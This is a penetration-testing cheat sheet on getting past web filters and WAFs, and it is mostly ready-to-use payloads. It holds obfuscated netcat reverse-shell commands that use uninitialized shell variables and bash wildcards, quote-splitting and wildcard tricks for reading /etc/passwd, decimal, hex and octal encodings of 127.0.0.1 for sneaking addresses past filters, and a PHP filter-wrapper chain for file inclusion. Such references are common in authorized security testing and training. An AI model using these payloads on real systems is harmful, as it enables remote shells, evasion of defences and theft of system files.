# Web Filter Bypass

## Payloads and Bypass Methods for Web Filtering

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings" %}
swisskyrepo / PayloadsAllTheThings
{% endembed %}

{% embed url="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/" %}
How To Exploit PHP Remotely To Bypass Filters & WAF Rules
{% endembed %}

### Use Uninitialized Shell Variables to Bypass Filters

{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" %}
Web Application Firewall (WAF) Evasion Techniques #3
{% endembed %}

Uninitialized shell variables can be used for bypassing web application firewalls (WAF).  Example: bypassing a filter to execute a reverse shell - `nc$u -e /bin$u/bash$u <ip> <port>`.  If this doesn't work try adding spaces before and after the variable (note the `+`'s, this example is also URL encoded): `nc+$u++-e+/bin$u/bash$u <ip> <port>` _(`$u` in this case is a random attacker-picked variable that would hopefully be uninitialized on the target)._

### Use Wildcards to Bypass Filters

{% embed url="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" %}
Web Application Firewall (WAF) Evasion Techniques
{% endembed %}

Bypass web filters by using bash wildcards:`/???/?s` `/?cmd=%2f???%2f??t%20%2f???%2fp??s??` will bypass...and execute every command that matches. such as `/bin/cat /etc/apt`, and `/bin/cat /etc/passwd`

netcat firewall bypass: `/???/n? -e /???/b??h 2130706433 1337` (`/???/?c.??????????? -e /???/b??h 2130706433 1337` for nc traditional)

```
Standard: /bin/nc 127.0.0.1 1337
Evasion:/???/n? 2130706433 1337
Used chars: / ? n [0-9]

Standard: /bin/cat /etc/passwd
Evasion: /???/??t /???/??ss??
Used chars: / ? t s
```

### Use String Concatenation to Bypass Filters

```
$ /bin/cat /etc/passwd
$ /bin/cat /e'tc'/pa'ss'wd
$ /bin/c'at' /e'tc'/pa'ss'wd
$ /b'i'n/c'a't /e't'c/p'a's's'w'd'
Can use \\ instead of ' as well
```

### Convert IP Address to Other Formats&#x20;

* [https://h.43z.one/ipconverter/](https://h.43z.one/ipconverter/)

It is still understood by most programs and languages when converted to other formats, such as decimal, and avoids `.` character in filtered HTTP requests: `127.0.0.1 = 2130706433`

```
http://127.0.0.1

#0 Concatenation
http://127.0.1
http://127.1

#Decimal
http://2130706433

#Hexidecimal
http://0x7f000001

#Dotted Hexidecimal
http://0x7f.0x0.0x0.0x1
http://0x7f.0x000001
http://0x7f.0x0.00x0001

#Others (need descriptions)
http://0177.00.00.01
http://000000177.0000000.000000000.0001
http://017700000001
http://%31%32%37%2e%30%2e%30%2e%31
http://127.0x0.000000000.0x1
http://①②⑦．⓪．⓪．①
```

Injecting IPs when `.` is disallowed: convert dotted-decimal format to decimal value - [`ip2dh`](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)

### LFI / RFI by Bypassing Filters Using Wrappers

From [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#lfi--rfi-using-wrappers)   `php://filter/` has multiple ways to bypass PHP input filters ;These can be chained with `|` or `/` : zip, data, expect, input, phar; many more different wrappers to try!

```php
/zlib.deflate/read=string.rot13/convert.base64-encode/convert.iconv.utf-8.utf-16/resource=<resource to get>
```

##
